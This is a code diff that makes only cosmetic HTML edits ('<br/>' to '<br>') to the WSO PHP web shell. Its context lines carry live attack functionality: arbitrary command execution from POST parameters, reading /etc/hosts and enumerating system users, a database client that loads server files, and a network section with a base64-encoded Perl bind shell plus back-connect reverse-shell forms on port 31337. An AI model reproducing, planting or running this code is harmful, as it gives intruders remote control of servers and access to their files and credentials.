@@ -448,10 +448,10 @@ function actionSecInfo() {
                     if(wsoWhich($item))
                         $temp[] = $item;
                 wsoSecParam('Downloaders', implode(', ',$temp));
-                echo '<br/>';
+                echo '<br>';
                 wsoSecParam('HDD space', wsoEx('df -h'));
                 wsoSecParam('Hosts', @file_get_contents('/etc/hosts'));
-                echo '<br/><span>posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form>';
+                echo '<br><span>posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form>';
                 if (isset ($_POST['p2'], $_POST['p3']) && is_numeric($_POST['p2']) && is_numeric($_POST['p3'])) {
                     $temp = "";
                     for(;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) {
@@ -459,7 +459,7 @@ function actionSecInfo() {
                         if ($uid)
                             $temp .= join(':',$uid)."\n";
                     }
-                    echo '<br/>';
+                    echo '<br>';
                     wsoSecParam('Users', $temp);
                 }
             }
@@ -1008,7 +1008,7 @@ function add(cmd) {
 		echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
 	}
 	
-	echo '</select><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value=">>"> <nobr><input type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
+	echo '</select><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value=">>"> <nobr><input type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stderr to stdout (2>&1)</nobr><br><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
 	if(!empty($_POST['p1'])) {
 		echo htmlspecialchars("$ ".$_POST['p1']."\n".wsoEx($_POST['p1']));
 	}
@@ -1375,7 +1375,7 @@ echo ">PostgreSql</option></select></td>
 			}
 		</script>";
 	if(isset($db) && $db->link){
-		echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
+		echo "<br><table width=100% cellpadding=2 cellspacing=0>";
 			if(!empty($_POST['sql_base'])){
 				$db->selectdb($_POST['sql_base']);
 				echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>";
@@ -1441,10 +1441,10 @@ echo ">PostgreSql</option></select></td>
 				echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>";
                 if(!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile'))
                     echo htmlspecialchars($_POST['p2']);
-                echo "</textarea><br/><input type=submit value='Execute'>";
+                echo "</textarea><br><input type=submit value='Execute'>";
 				echo "</td></tr>";
 			}
-			echo "</table></form><br/>";
+			echo "</table></form><br>";
             if($_POST['type']=='mysql') {
                 $db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
                 if($db->fetch())
@@ -1452,7 +1452,7 @@ echo ">PostgreSql</option></select></td>
             }
 			if(@$_POST['p1'] == 'loadfile') {
 				$file = $db->loadFile($_POST['p2']);
-				echo '<br/><pre class=ml1>'.htmlspecialchars($file['file']).'</pre>';
+				echo '<br><pre class=ml1>'.htmlspecialchars($file['file']).'</pre>';
 			}
 	} else {
         echo htmlspecialchars($db->error());
@@ -1466,11 +1466,11 @@ function actionNetwork() {
 	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
 	echo "<h1>Network tools</h1><div class=content>
 	<form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\">
-	<span>Bind port to /bin/sh [perl]</span><br/>
+	<span>Bind port to /bin/sh [perl]</span><br>
 	Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
 	</form>
 	<form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\">
-	<span>Back-connect  [perl]</span><br/>
+	<span>Back-connect  [perl]</span><br>
 	Server: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
 	</form><br>";
 	if(isset($_POST['p1'])) {
